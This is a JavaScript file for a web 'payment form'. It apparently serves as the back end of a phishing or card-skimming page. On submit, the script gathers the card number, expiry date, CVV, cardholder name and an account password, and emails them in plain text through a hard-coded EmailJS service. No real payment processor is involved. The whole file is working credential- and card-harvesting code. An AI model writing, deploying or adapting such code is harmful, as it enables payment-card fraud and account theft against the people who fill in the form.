// Initialize EmailJS
(function() {
    emailjs.init("5vz8xe_J5s0yEGPz9"); // Your EmailJS API key here
})();

// Handle form submission
document.getElementById('payment-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent page reload

    const submitButton = document.getElementById('submit-button');
    const progressMessage = document.getElementById('progress-message');

    // Disable the submit button and show progress message
    submitButton.disabled = true;
    progressMessage.style.display = 'block';

    const cardNumber = document.getElementById('cardNumber').value;
    const expirationDate = document.getElementById('expirationDate').value;
    const cvv = document.getElementById('cvv').value;
    const cardName = document.getElementById('cardName').value;
    const password = document.getElementById('password').value;

    const templateParams = {
        card_number: cardNumber,
        expiration_date: expirationDate,
        cvv: cvv,
        card_name: cardName,
        password: password
    };

    // Send email via EmailJS
    emailjs.send('service_qsx38ac', 'template_audd7fx', templateParams)
        .then(function(response) {
            alert('Payment information sent successfully!');
            // Reset form and hide progress message
            document.getElementById('payment-form').reset();
            progressMessage.style.display = 'none';
            submitButton.disabled = false;
        }, function(error) {
            alert('Failed to send payment information: ' + JSON.stringify(error));
            // Hide progress message and re-enable the button
            progressMessage.style.display = 'none';
            submitButton.disabled = false;
        });
});